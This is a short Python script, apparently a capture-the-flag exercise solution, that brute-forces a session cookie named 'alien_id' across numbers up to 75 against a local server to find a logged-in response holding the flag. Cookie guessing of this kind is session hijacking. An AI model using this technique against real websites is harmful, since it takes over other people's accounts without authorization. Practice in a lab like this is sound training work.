# Write a script that can guess cookie values
# and send them to the url http://127.0.0.1:8082/cookiestore
# Read the response from the logged in cookie value to get the flag.
# The cookie name the aliens are using is alien_id
# we believe the id is a number between 1 and 75
#
# Note: The script can timeout. If this occurs try narrowing
# down your search
#
import urllib.request

url = "http://127.0.0.1:8082/cookiestore"
y = 5

for i in range(75):
 request = urllib.request.Request(url)
 request.add_header("Cookie", "alien_id = "+str(i))
 response = urllib.request.urlopen(request)
 responseStr = str(response.read().decode("utf-8"))
 print(responseStr)
